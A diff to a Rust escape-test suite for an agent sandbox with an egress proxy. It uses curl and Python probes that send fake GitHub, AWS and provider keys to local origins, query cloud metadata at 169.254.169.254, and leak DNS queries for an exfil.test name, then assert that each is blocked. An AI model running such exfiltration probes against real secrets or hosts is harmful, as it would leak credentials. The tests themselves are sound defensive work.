@@ -3,7 +3,9 @@
 //! closed. Tests are named after threat-model ids (`docs/threat-model.md`).
 //!
 //! Fixtures are benign: fake keys with obvious markers, and no network
-//! destination other than loopback.
+//! destination other than host loopback (origins the tests start
+//! themselves), TEST-NET addresses that must be unreachable, and
+//! `169.254.169.254`, which the proxy must refuse before connecting.
 //!
 //! On a host where no backend is available every test prints
 //! `UNTESTED ON THIS HOST` instead of passing silently. Set
@@ -27,11 +29,17 @@ fn require_sandbox() -> bool {
 
 #[cfg(unix)]
 mod suite {
+    use std::collections::BTreeSet;
     use std::fs;
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
     use std::os::unix::fs::PermissionsExt;
     use std::path::{Path, PathBuf};
     use std::process::{Command, Output};
-    use std::sync::OnceLock;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::{Arc, Mutex, OnceLock};
+    use std::thread;
+    use std::time::Duration;
 
     use super::require_sandbox;
 
@@ -45,7 +53,8 @@ mod suite {
 
     /// A fake home with planted secrets and a project directory.
     pub struct Harness {
-        pub _root: tempfile::TempDir,
+        /// Keeps the fixture tree alive; also holds host-only files (CA PEMs, traces).
+        pub root: tempfile::TempDir,
         pub home: PathBuf,
         pub project: PathBuf,
         /// Backend under test.
@@ -106,7 +115,7 @@ mod suite {
                 .output()
                 .ok();
             Self {
-                _root: root,
+                root,
                 home,
                 project,
                 backend: backend.to_string(),
@@ -118,6 +127,21 @@ mod suite {
         /// Run a shell snippet inside the sandbox. `extra_policy` is written
         /// to the project's agentkeep.toml (after `schema = 1`).
         pub fn run(&self, extra_policy: &str, script: &str) -> Output {
+            self.command(None, extra_policy, &["sh", "-c", script], &[])
+                .output()
+                .expect("spawn agentkeep")
+        }
+
+        /// The `agentkeep run -- <argv>` invocation, optionally wrapped
+        /// (`wrapper[0]` is the program, e.g. `strace`), with extra
+        /// variables in the supervisor's environment.
+        fn command(
+            &self,
+            wrapper: Option<&[&str]>,
+            extra_policy: &str,
+            argv: &[&str],
+            env: &[(&str, &str)],
+        ) -> Command {
             if extra_policy.is_empty() {
                 let _ = fs::remove_file(self.project.join("agentkeep.toml"));
             } else {
@@ -127,13 +151,21 @@ mod suite {
                 )
                 .unwrap();
             }
-            let mut args = vec!["--no-ask", "run"];
+            let mut cli = vec!["--no-ask", "run"];
             if self.forced {
-                args.extend(["--backend", self.backend.as_str()]);
+                cli.extend(["--backend", self.backend.as_str()]);
             }
-            args.extend(["--", "sh", "-c", script]);
-            Command::new(bin())
-                .args(&args)
+            cli.push("--");
+            cli.extend(argv);
+            let mut cmd = match wrapper {
+                Some(w) => {
+                    let mut c = Command::new(w[0]);
+                    c.args(&w[1..]).arg(bin());
+                    c
+                }
+                None => Command::new(bin()),
+            };
+            cmd.args(&cli)
                 .current_dir(&self.project)
                 .env_clear()
                 .env("HOME", &self.home)
@@ -141,9 +173,93 @@ mod suite {
                 .env("USER", "escapetester")
                 .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                 .env("LD_PRELOAD", "/nonexistent/evil.so")
-                .env("TERM", "dumb")
+                .env("TERM", "dumb");
+            for (k, v) in env {
+                cmd.env(k, v);
+            }
+            cmd
+        }
+
+        fn session_dirs(&self) -> BTreeSet<PathBuf> {
+            fs::read_dir(self.home.join(".local/share/agentkeep/sessions"))
+                .map(|rd| rd.flatten().map(|e| e.path()).collect())
+                .unwrap_or_default()
+        }
+
+        /// Run, then load and verify the audit log of exactly that session.
+        pub fn run_logged(
+            &self,
+            wrapper: Option<&[&str]>,
+            extra_policy: &str,
+            argv: &[&str],
+            env: &[(&str, &str)],
+        ) -> Logged {
+            let before = self.session_dirs();
+            let output = self
+                .command(wrapper, extra_policy, argv, env)
                 .output()
-                .expect("spawn agentkeep")
+                .expect("spawn agentkeep");
+            let new: Vec<PathBuf> = self.session_dirs().difference(&before).cloned().collect();
+            assert_eq!(new.len(), 1, "expected one new session:\n{}", out(&output));
+            let path = new[0].join("events.jsonl");
+            let raw = fs::read_to_string(&path).unwrap();
+            let events = agentkeep_audit::verify(&path)
+                .unwrap_or_else(|e| panic!("audit chain broken: {e}\n{raw}"));
+            Logged {
+                output,
+                events,
+                raw,
+            }
+        }
+
+        /// Write a file into the project (fixtures the sandbox reads, so
+        /// secrets never appear on the logged command line).
+        pub fn fixture(&self, name: &str, content: &str) {
+            let dir = self.project.join(".fx");
+            fs::create_dir_all(&dir).unwrap();
+            fs::write(dir.join(name), content).unwrap();
+        }
+    }
+
+    /// One session's output and verified audit events.
+    pub struct Logged {
+        pub output: Output,
+        pub events: Vec<agentkeep_audit::Event>,
+        /// The raw JSONL, to prove a secret is absent from every field.
+        pub raw: String,
+    }
+
+    impl Logged {
+        pub fn text(&self) -> String {
+            out(&self.output)
+        }
+
+        /// Payloads of every event of `kind`.
+        pub fn of(&self, kind: &str) -> Vec<&serde_json::Value> {
+            self.events
+                .iter()
+                .filter(|e| e.kind == kind)
+                .map(|e| &e.data)
+                .collect()
+        }
+
+        /// Events of `kind` whose `port` field is `port`.
+        pub fn at(&self, kind: &str, port: u16) -> Vec<&serde_json::Value> {
+            self.of(kind)
+                .into_iter()
+                .filter(|d| d["port"] == port)
+                .collect()
+        }
+
+        /// The audit log must never contain these strings anywhere.
+        pub fn assert_log_free_of(&self, secrets: &[&str]) {
+            for s in secrets {
+                assert!(
+                    !self.raw.contains(s),
+                    "secret `{s}` written to the audit log:\n{}",
+                    self.raw
+                );
+            }
         }
     }
 
@@ -462,6 +578,811 @@ print("pvr", r, os.strerror(ctypes.get_errno()))
             let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
             assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
         }
+    }
+
+    // ---- N: network through the egress proxy ------------------------
+    //
+    // Every origin below is started by the test on host 127.0.0.1 and
+    // records each byte it receives, so a test can prove that a blocked
+    // secret never arrived. Inside the sandbox `NO_PROXY` lists loopback
+    // (for the agent's own local servers), so requests to these host-side
+    // origins name the in-sandbox relay explicitly. Secrets reach the
+    // sandbox as fixture files, never on the command line, because the
+    // command line is logged.
+
+    /// Fake credentials in the formats the DLP detectors know.
+    const FAKE_GH_TOKEN: &str = "ghp_TESTFAKEagentkeepEscapeSuite00000000";
+    const FAKE_AWS_KEY: &str = "AKIATESTFAKE00000000";
+    const FAKE_PROVIDER_KEY: &str = "sk-ant-test-fake-agentkeep-escape-0000";
+    /// An exfiltration-shaped name under a reserved TLD.
+    const EXFIL_NAME: &str = "akiatestfake00000000.exfil.test";
+
+    /// Shell prelude: `px` sends a request through the relay explicitly and
+    /// ends the output with a newline so `-w` tags start a line.
+    const PX: &str =
+        "px() { curl -sS -m 10 --noproxy '' -x http://127.0.0.1:3128 \"$@\"; echo; }\n";
+
+    /// A local origin that records what it receives. Plain HTTP/1.1 or TLS
+    /// (self-signed for `localhost`); answers `origin-ok <request line>`,
+    /// or `101` and an echo for a WebSocket upgrade.
+    pub struct Origin {
+        pub port: u16,
+        seen: Arc<Mutex<Vec<u8>>>,
+        conns: Arc<AtomicUsize>,
+    }
+
+    impl Origin {
+        pub fn plain() -> Self {
+            Self::start(None)
+        }
+
+        /// Returns the origin and its certificate, PEM encoded.
+        pub fn tls() -> (Self, String) {
+            let key = rcgen::KeyPair::generate().unwrap();
+            let cert = rcgen::CertificateParams::new(vec!["localhost".to_string()])
+                .unwrap()
+                .self_signed(&key)
+                .unwrap();
+            let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(
+                rustls_pki_types::PrivatePkcs8KeyDer::from(key.serialize_der()),
+            );
+            let cfg = rustls::ServerConfig::builder_with_provider(Arc::new(
+                rustls::crypto::ring::default_provider(),
+            ))
+            .with_safe_default_protocol_versions()
+            .unwrap()
+            .with_no_client_auth()
+            .with_single_cert(vec![cert.der().clone()], key_der)
+            .unwrap();
+            (Self::start(Some(Arc::new(cfg))), cert.pem())
+        }
+
+        fn start(tls: Option<Arc<rustls::ServerConfig>>) -> Self {
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            let port = listener.local_addr().unwrap().port();
+            let seen = Arc::new(Mutex::new(Vec::new()));
+            let conns = Arc::new(AtomicUsize::new(0));
+            let (record, count) = (Arc::clone(&seen), Arc::clone(&conns));
+            thread::spawn(move || {
+                for stream in listener.incoming().flatten() {
+                    count.fetch_add(1, Ordering::SeqCst);
+                    let seen = Arc::clone(&record);
+                    let tls = tls.clone();
+                    thread::spawn(move || {
+                        let _ = stream.set_read_timeout(Some(Duration::from_secs(20)));
+                        match tls {
+                            Some(cfg) => {
+                                let conn = rustls::ServerConnection::new(cfg).unwrap();
+                                let inner = rustls::StreamOwned::new(conn, stream);
+                                serve_origin(Recorder { inner, seen });
+                            }
+                            None => serve_origin(Recorder {
+                                inner: stream,
+                                seen,
+                            }),
+                        }
+                    });
+                }
+            });
+            Self { port, seen, conns }
+        }
+
+        /// Everything received so far (plaintext, after TLS).
+        pub fn received(&self) -> String {
+            String::from_utf8_lossy(&self.seen.lock().unwrap()).into_owned()
+        }
+
+        /// TCP connections accepted so far.
+        pub fn connections(&self) -> usize {
+            self.conns.load(Ordering::SeqCst)
+        }
+    }
+
+    struct Recorder<S> {
+        inner: S,
+        seen: Arc<Mutex<Vec<u8>>>,
+    }
+
+    impl<S: Read> Read for Recorder<S> {
+        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+            let n = self.inner.read(buf)?;
+            self.seen.lock().unwrap().extend_from_slice(&buf[..n]);
+            Ok(n)
+        }
+    }
+
+    impl<S: Write> Write for Recorder<S> {
+        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
+            self.inner.write(buf)
+        }
+        fn flush(&mut self) -> std::io::Result<()> {
+            self.inner.flush()
+        }
+    }
+
+    fn serve_origin<S: Read + Write>(mut s: S) {
+        let mut buf = Vec::new();
+        let mut tmp = [0u8; 8192];
+        let end = loop {
+            if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
+                break i + 4;
+            }
+            match s.read(&mut tmp) {
+                Ok(0) | Err(_) => return,
+                Ok(n) => buf.extend_from_slice(&tmp[..n]),
+            }
+        };
+        let head = String::from_utf8_lossy(&buf[..end]).to_string();
+        let lower = head.to_ascii_lowercase();
+        let line = head.lines().next().unwrap_or_default().to_string();
+        if lower.contains("\r\nupgrade: websocket") {
+            let _ = s.write_all(
+                b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
+            );
+            let _ = s.flush();
+            let mut pending = buf[end..].to_vec();
+            loop {
+                if !pending.is_empty() {
+                    if s.write_all(&pending).is_err() {
+                        return;
+                    }
+                    let _ = s.flush();
+                    pending.clear();
+                }
+                match s.read(&mut tmp) {
+                    Ok(0) | Err(_) => return,
+                    Ok(n) => pending.extend_from_slice(&tmp[..n]),
+                }
+            }
+        }
+        let len: usize = lower
+            .lines()
+            .find_map(|l| l.strip_prefix("content-length:"))
+            .and_then(|v| v.trim().parse().ok())
+            .unwrap_or(0);
+        while buf.len() < end + len {
+            match s.read(&mut tmp) {
+                Ok(0) | Err(_) => return,
+                Ok(n) => buf.extend_from_slice(&tmp[..n]),
+            }
+        }
+        let body = format!("origin-ok {line}\n");
+        let _ = write!(
+            s,
+            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+            body.len()
+        );
+        let _ = s.flush();
+    }
+
+    /// Gate on host tools the probes need. A missing tool is UNTESTED,
+    /// which fails under `AGENTKEEP_REQUIRE_SANDBOX`.
+    fn tools(id: &str, needed: &[&str]) -> bool {
+        for t in needed {
+            if !has(t) {
+                let msg = format!("UNTESTED [{id}]: `{t}` missing on this host");
+                println!("{msg}");
+                eprintln!("{msg}");
+                assert!(!require_sandbox(), "{msg}");
+                return false;
+            }
+        }
+        true
+    }
+
+    /// `strace` arguments that log `calls` for the whole process tree.
+    fn strace(trace: &Path, calls: &str) -> Vec<String> {
+        vec![
+            "strace".into(),
+            "-f".into(),
+            "-qq".into(),
+            "-e".into(),
+            format!("trace={calls}"),
+            "-e".into(),
+            "signal=none".into(),
+            "-o".into(),
+            trace.display().to_string(),
+        ]
+    }
+
+    /// Lines of an strace log that reach for anything but a Unix socket or
+    /// one of the `allowed` loopback endpoints, or consult a name service.
+    fn outbound_attempts(trace: &str, allowed: &[&str]) -> Vec<String> {
+        trace
+            .lines()
+            .filter(|l| {
+                if l.contains("io.systemd.Resolve") || l.contains("nscd/socket") {
+                    return true;
+                }
+                let inet = l.contains("sa_family=AF_INET") || l.contains("sa_family=AF_UNSPEC");
+                if l.contains("connect(") {
+                    !l.contains("sa_family=AF_UNIX") && !allowed.iter().any(|a| l.contains(a))
+                } else if l.contains("sendto(") || l.contains("sendmsg(") {
+                    inet
+                } else {
+                    false
+                }
+            })
+            .map(String::from)
+            .collect()
+    }
+
+    /// The in-sandbox side of the relay as strace prints it.
+    const RELAY_CONNECT: &str = "sin_port=htons(3128), sin_addr=inet_addr(\"127.0.0.1\")";
+
+    /// Assert a DLP block was logged with a redacted sample.
+    fn assert_redacted(block: &serde_json::Value, secret: &str) {
+        let sample = block["sample"].as_str().unwrap_or_default();
+        assert!(
+            sample.starts_with(&secret[..4]),
+            "sample should keep the first four characters: {block}"
+        );
+        assert!(
+            !sample.contains(&secret[4..12]),
+            "sample leaks the secret: {block}"
+        );
+    }
+
+    #[test]
+    fn positive_control_allowed_host_works_through_the_proxy() {
+        let Some(h) = harness("N1 control") else {
+            return;
+        };
+        if !tools("N1 control", &["curl"]) {
+            return;
+        }
+        let o = Origin::plain();
+        let p = o.port;
+        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
+        let script = format!(
+            "{PX}px -w 'proxied=%{{http_code}}\\n' http://127.0.0.1:{p}/hello
+curl -sS -m 5 --noproxy '*' http://127.0.0.1:{p}/direct; echo direct-rc=$?"
+        );
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        let text = l.text();
+        assert!(text.contains("origin-ok GET /hello HTTP/1.1"), "{text}");
+        assert!(text.contains("proxied=200"), "{text}");
+        let req = l.at("net.request", p);
+        assert_eq!(req.len(), 1, "{}", l.raw);
+        assert_eq!(req[0]["host"], "127.0.0.1");
+        assert_eq!(req[0]["method"], "GET");
+        assert_eq!(req[0]["path"], "/hello");
+        assert_eq!(req[0]["status"], 200);
+        assert_eq!(req[0]["inspected"], true);
+        // N4: the same origin is unreachable without the proxy, because the
+        // sandbox's loopback is not the host's.
+        if h.requires("N4 direct", "net_isolation") {
+            assert!(!text.contains("direct-rc=0"), "{text}");
+            assert!(!o.received().contains("/direct"), "{}", o.received());
+        }
+    }
+
+    #[test]
+    fn n1_denied_hosts_get_403_and_are_never_contacted() {
+        let Some(h) = harness("N1") else { return };
+        if !tools("N1", &["curl"]) {
+            return;
+        }
+        let unlisted = Origin::plain();
+        let denied = Origin::plain();
+        let (p, q) = (unlisted.port, denied.port);
+        // `localhost` is not allowed at all; 127.0.0.1:q is allowed by a
+        // broad rule and denied by a specific one, and deny wins.
+        let policy = format!(
+            "[network]\nallow = [\"127.0.0.1\"]\ndeny = [\"127.0.0.1:{q}\"]\nallow_private = true\n"
+        );
+        let script = format!(
+            "{PX}px -w 'unlisted=%{{http_code}}\\n' http://localhost:{p}/a
+px -p -o /dev/null -w 'tunnel=%{{http_connect}}\\n' http://localhost:{p}/b
+px -w 'denied=%{{http_code}}\\n' http://127.0.0.1:{q}/c"
+        );
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        let text = l.text();
+        assert!(text.contains("unlisted=403"), "{text}");
+        assert!(text.contains("tunnel=403"), "{text}");
+        assert!(text.contains("denied=403"), "{text}");
+        assert!(
+            text.contains("denied by policy (network: not allowed)"),
+            "{text}"
+        );
+        assert!(
+            text.contains(&format!("denied by policy (network.deny `127.0.0.1:{q}`)")),
+            "{text}"
+        );
+        assert_eq!(unlisted.connections(), 0, "denied origin was contacted");
+        assert_eq!(denied.connections(), 0, "denied origin was contacted");
+        let deny_p = l.at("net.deny", p);
+        assert_eq!(deny_p.len(), 2, "{}", l.raw);
+        assert!(deny_p.iter().all(|d| d["host"] == "localhost"));
+        let deny_q = l.at("net.deny", q);
+        assert_eq!(deny_q.len(), 1, "{}", l.raw);
+        assert!(deny_q[0]["rule"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("network.deny"));
+        assert!(l.of("net.request").is_empty(), "{}", l.raw);
+    }
+
+    /// The three places a secret hides in a request, plus a clean control.
+    fn dlp_probes(base: &str, extra_curl: &str) -> String {
+        format!(
+            "{PX}px {extra_curl} -w 'header=%{{http_code}}\\n' -H \"Authorization: token $(cat .fx/gh)\" {base}/h
+px {extra_curl} -w 'query=%{{http_code}}\\n' \"{base}/q?key=$(cat .fx/aws)\"
+px {extra_curl} -w 'body=%{{http_code}}\\n' --data-binary @.fx/body {base}/b
+px {extra_curl} -w 'clean=%{{http_code}}\\n' --data-binary 'nothing to see' {base}/c"
+        )
+    }
+
+    fn dlp_fixtures(h: &Harness) {
+        h.fixture("gh", FAKE_GH_TOKEN);
+        h.fixture("aws", FAKE_AWS_KEY);
+        h.fixture("body", &format!("note=keep {FAKE_AWS_KEY} safe\n"));
+    }
+
+    fn assert_dlp_probes(l: &Logged, origin: &Origin) {
+        let text = l.text();
+        for tag in ["header=403", "query=403", "body=403"] {
+            assert!(text.contains(tag), "missing {tag}:\n{text}");
+        }
+        assert!(
+            text.contains("(github_token in header:authorization)"),
+            "{text}"
+        );
+        assert!(text.contains("(aws_access_key_id in url)"), "{text}");
+        assert!(text.contains("(aws_access_key_id in body)"), "{text}");
+        assert!(text.contains("clean=200"), "{text}");
+        assert!(text.contains("origin-ok POST /c HTTP/1.1"), "{text}");
+
+        let blocks = l.at("dlp.block", origin.port);
+        let found: Vec<(String, String)> = blocks
+            .iter()
+            .map(|b| {
+                (
+                    b["detector"].as_str().unwrap_or_default().to_string(),
+                    b["location"].as_str().unwrap_or_default().to_string(),
+                )
+            })
+            .collect();
+        assert_eq!(
+            found,
+            vec![
+                ("github_token".into(), "header:authorization".into()),
+                ("aws_access_key_id".into(), "url".into()),
+                ("aws_access_key_id".into(), "body".into()),
+            ],
+            "{}",
+            l.raw
+        );
+        assert_redacted(blocks[0], FAKE_GH_TOKEN);
+        assert_redacted(blocks[1], FAKE_AWS_KEY);
+        let got = origin.received();
+        assert!(got.contains("POST /c"), "control request missing:\n{got}");
+        for s in [FAKE_GH_TOKEN, FAKE_AWS_KEY] {
+            assert!(!got.contains(s), "origin received `{s}`:\n{got}");
+        }
+        l.assert_log_free_of(&[FAKE_GH_TOKEN, FAKE_AWS_KEY]);
+    }
+
+    #[test]
+    fn n2_secrets_are_blocked_over_plain_http_and_never_reach_the_origin() {
+        let Some(h) = harness("N2 http") else { return };
+        if !tools("N2 http", &["curl"]) {
+            return;
+        }
+        dlp_fixtures(&h);
+        let o = Origin::plain();
+        let p = o.port;
+        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
+        let script = dlp_probes(&format!("http://127.0.0.1:{p}"), "");
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        assert_dlp_probes(&l, &o);
+        // Plaintext HTTP inside a CONNECT tunnel is scanned too: the port
+        // is not a reason to skip inspection.
+        let script = dlp_probes(&format!("http://127.0.0.1:{p}"), "-p");
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        assert_dlp_probes(&l, &o);
+    }
+
+    #[test]
+    fn n2_secrets_are_blocked_inside_an_inspected_tls_tunnel() {
+        let Some(h) = harness("N2 tls") else { return };
+        if !tools("N2 tls", &["curl"]) {
+            return;
+        }
+        dlp_fixtures(&h);
+        let (o, pem) = Origin::tls();
+        let p = o.port;
+        // The origin's certificate is trusted by the proxy (outside), not
+        // by the sandbox: inside, only the session CA is.
+        let pem_path = h.root.path().join("origin.pem");
+        fs::write(&pem_path, pem).unwrap();
+        let policy = format!(
+            "[network]\nallow = [\"localhost:{p}\"]\nallow_private = true\ntrusted_cas = [\"{}\"]\n",
+            pem_path.display()
+        );
+        let script = dlp_probes(&format!("https://localhost:{p}"), "");
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        assert_dlp_probes(&l, &o);
+        let req = l.at("net.request", p);
+        assert_eq!(req.len(), 1, "{}", l.raw);
+        assert_eq!(req[0]["tls"], true);
+        assert_eq!(req[0]["inspected"], true);
+        assert_eq!(req[0]["path"], "/c");
+    }
+
+    #[test]
+    fn e3_provider_key_reaches_only_its_bound_host() {
+        let Some(h) = harness("E3") else { return };
+        if !tools("E3", &["curl"]) {
+            return;
+        }
+        let other = Origin::plain();
+        let provider = Origin::plain();
+        let (pa, pb) = (other.port, provider.port);
+        let policy = format!(
+            "[env]\npass = [\"ANTHROPIC_API_KEY\"]\n[network]\nallow = [\"127.0.0.1:{pa}\", \"localhost:{pb}\"]\nallow_private = true\n[dlp]\nallow_provider_keys_to = {{ ANTHROPIC_API_KEY = [\"localhost:{pb}\"] }}\n"
+        );
+        let script = format!(
+            "{PX}test -n \"$ANTHROPIC_API_KEY\" && echo key-present
+px -w 'misrouted=%{{http_code}}\\n' -H \"x-api-key: $ANTHROPIC_API_KEY\" http://127.0.0.1:{pa}/v1/messages
+px -w 'bound=%{{http_code}}\\n' -H \"x-api-key: $ANTHROPIC_API_KEY\" http://localhost:{pb}/v1/messages"
+        );
+        let l = h.run_logged(
+            None,
+            &policy,
+            &["sh", "-c", &script],
+            &[("ANTHROPIC_API_KEY", FAKE_PROVIDER_KEY)],
+        );
+        let text = l.text();
+        assert!(text.contains("key-present"), "env.pass failed:\n{text}");
+        assert!(text.contains("misrouted=403"), "{text}");
+        assert!(
+            text.contains("bound_secret_misrouted:ANTHROPIC_API_KEY in header:x-api-key"),
+            "{text}"
+        );
+        assert!(text.contains("bound=200"), "{text}");
+        assert!(text.contains("origin-ok GET /v1/messages"), "{text}");
+        assert!(
+            !other.received().contains(FAKE_PROVIDER_KEY),
+            "key reached the wrong host:\n{}",
+            other.received()
+        );
+        assert!(
+            provider.received().contains(FAKE_PROVIDER_KEY),
+            "key must reach its own provider:\n{}",
+            provider.received()
+        );
+        let blocks = l.at("dlp.block", pa);
+        assert_eq!(blocks.len(), 1, "{}", l.raw);
+        assert_eq!(
+            blocks[0]["detector"],
+            "bound_secret_misrouted:ANTHROPIC_API_KEY"
+        );
+        assert_redacted(blocks[0], FAKE_PROVIDER_KEY);
+        assert!(l.at("dlp.block", pb).is_empty(), "{}", l.raw);
+        let start = l.of("session.start");
+        assert!(
+            start[0]["network"]["bound_secrets"]
+                .as_array()
+                .is_some_and(|a| a.iter().any(|n| n == "ANTHROPIC_API_KEY")),
+            "{}",
+            l.raw
+        );
+        l.assert_log_free_of(&[FAKE_PROVIDER_KEY]);
+    }
+
+    #[test]
+    fn n5_private_ranges_and_cloud_metadata_are_refused() {
+        let Some(h) = harness("N5") else { return };
+        if !tools("N5", &["curl"]) {
+            return;
+        }
+        let o = Origin::plain();
+        let p = o.port;
+        // Everything is on the allowlist; the address check still refuses.
+        let policy = format!(
+            "[network]\nallow = [\"127.0.0.1:{p}\", \"localhost:{p}\", \"169.254.169.254\"]\nallow_private = false\n"
+        );
+        let script = format!(
+            "{PX}px -w 'loopback=%{{http_code}}\\n' http://127.0.0.1:{p}/a
+px -w 'name=%{{http_code}}\\n' http://localhost:{p}/b
+px -w 'metadata=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/
+px -p -w 'metadata_tunnel=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/"
+        );
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        let text = l.text();
+        for tag in [
+            "loopback=502",
+            "name=502",
+            "metadata=502",
+            "metadata_tunnel=502",
+        ] {
+            assert!(text.contains(tag), "missing {tag}:\n{text}");
+        }
+        assert!(
+            text.contains("resolves to non-public address 127.0.0.1"),
+            "{text}"
+        );
+        assert!(
+            text.contains("169.254.169.254 resolves to non-public address 169.254.169.254"),
+            "{text}"
+        );
+        assert_eq!(o.connections(), 0, "private origin was contacted");
+        let errors = l.of("net.error");
+        assert!(
+            errors.len() >= 4
+                && errors.iter().all(|e| e["error"]
+                    .as_str()
+                    .unwrap_or_default()
+                    .contains("non-public")),
+            "{}",
+            l.raw
+        );
+        assert!(l.of("net.request").is_empty(), "{}", l.raw);
+    }
+
+    #[test]
+    fn n2_passthrough_hosts_are_tunnelled_unscanned_and_logged_as_such() {
+        let Some(h) = harness("N2 passthrough") else {
+            return;
+        };
+        if !tools("N2 passthrough", &["curl"]) {
+            return;
+        }
+        let (o, pem) = Origin::tls();
+        let p = o.port;
+        h.fixture("origin.pem", &pem);
+        h.fixture("gh", FAKE_GH_TOKEN);
+        // Passthrough does not imply allow: 127.0.0.1:p is passthrough only.
+        let policy = format!(
+            "[network]\nallow = [\"localhost:{p}\"]\npassthrough = [\"localhost:{p}\", \"127.0.0.1:{p}\"]\nallow_private = true\n"
+        );
+        let script = format!(
+            "{PX}px --cacert .fx/origin.pem -w 'pass=%{{http_code}}\\n' -H \"Authorization: token $(cat .fx/gh)\" https://localhost:{p}/pass
+px --cacert .fx/origin.pem -o /dev/null -w 'unlisted=%{{http_connect}}\\n' https://127.0.0.1:{p}/x"
+        );
+        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
+        let text = l.text();
+        // The client saw the origin's own certificate: no interception.
+        assert!(text.contains("pass=200"), "{text}");
+        assert!(text.contains("origin-ok GET /pass HTTP/1.1"), "{text}");
+        assert!(text.contains("unlisted=403"), "{text}");
+        let tunnels = l.at("net.tunnel", p);
+        assert_eq!(tunnels.len(), 1, "{}", l.raw);
+        assert_eq!(tunnels[0]["host"], "localhost");
+        assert_eq!(tunnels[0]["inspected"], false);
+        assert!(l.at("net.request", p).is_empty(), "{}", l.raw);
+        assert!(l.at("dlp.block", p).is_empty(), "{}", l.raw);
+        assert_eq!(l.at("net.deny", p)[0]["host"], "127.0.0.1");
+        // Documented (limitations.md): passthrough means no DLP, so the
+        // token arrives. Pinned so that a change here is deliberate.
+        assert!(o.received().contains(FAKE_GH_TOKEN), "{}", o.received());
+        l.assert_log_free_of(&[FAKE_GH_TOKEN]);
+    }
+
+    #[test]
+    fn n3_dns_cannot_leave_and_denied_names_are_never_resolved() {
+        let Some(h) = harness("N3") else { return };
+        if !tools("N3", &["python3"]) {
+            return;
+        }
+        // Inside: no resolver is reachable, not even by raw UDP.
+        if h.requires("N3 resolver", "net_namespace") {
+            h.fixture(
+                "dns.py",
+                &format!(
+                    r#"import socket
+name = "{EXFIL_NAME}"
+q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+q += b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00\x00\x01\x00\x01"
+for ns in ["127.0.0.53", "192.0.2.53"]:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(2)
+    try:
+        s.sendto(q, (ns, 53))
+        s.recvfrom(512)
+        print("DNS-ANSWERED", ns)
+    except OSError as e:
+        print("dns-blocked", ns, e)
+"#
+                ),
+            );
+            let o = h.run(
+                "",
+                &format!("getent hosts {EXFIL_NAME}; echo getent-rc=$?; python3 .fx/dns.py"),
+            );
+            let text = out(&o);
+            assert!(text.contains("getent-rc=2"), "{text}");
+            assert!(text.contains("dns-blocked 127.0.0.53"), "{text}");
+            assert!(
+                text.contains("dns-blocked 192.0.2.53 [Errno 101] Network is unreachable"),
+                "{text}"
+            );
+            assert!(!text.contains("DNS-ANSWERED"), "{text}");
+        }
+
+        // Through the proxy: a denied name is refused before the supervisor
+        // resolves or connects anything.
+        h.fixture(
+            "ask.py",
+            &format!(
+                r#"import socket
+for req in [b"CONNECT {EXFIL_NAME}:443 HTTP/1.1\r\nHost: {EXFIL_NAME}:443\r\n\r\n",
+            b"GET http://{EXFIL_NAME}/x HTTP/1.1\r\nHost: {EXFIL_NAME}\r\nConnection: close\r\n\r\n"]:
+    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
+    s.sendall(req)
+    data = b""
+    while True:
+        d = s.recv(4096)
+        if not d:
+            break
+        data += d
+    print("reply:", data.split(b"\r\n")[0].decode())
+"#
+            ),
+        );
+        let trace = h.root.path().join("n3.trace");
+        let traced = tools("N3 strace", &["strace"]);
+        let wrapper = strace(&trace, "connect,sendto,sendmsg");
+        let wrapper: Vec<&str> = wrapper.iter().map(String::as_str).collect();
+        let l = h.run_logged(
+            traced.then_some(wrapper.as_slice()),
+            "",
+            &["sh", "-c", "python3 .fx/ask.py"],
+            &[],
+        );
+        let text = l.text();
+        assert_eq!(text.matches("reply: HTTP/1.1 403").count(), 2, "{text}");
+        let denies: Vec<_> = l
+            .of("net.deny")
+            .into_iter()
+            .filter(|d| d["host"] == EXFIL_NAME)
+            .collect();
+        assert_eq!(denies.len(), 2, "{}", l.raw);
+        assert!(
+            l.of("net.error").is_empty(),
+            "a lookup was attempted:\n{}",
+            l.raw
+        );
+        if traced {
+            let trace = fs::read_to_string(&trace).unwrap();
+            assert!(
+                trace.contains(RELAY_CONNECT),
+                "strace did not follow into the sandbox:\n{trace}"
+            );
+            let bad = outbound_attempts(&trace, &[RELAY_CONNECT]);
+            assert!(bad.is_empty(), "outbound attempts: {bad:#?}");
+        }
+    }
+
+    #[test]
+    fn n7_websocket_upgrade_is_tunnelled_and_logged_unscanned() {
+        let Some(h) = harness("N7") else { return };
+        if !tools("N7", &["python3"]) {
+            return;
+        }
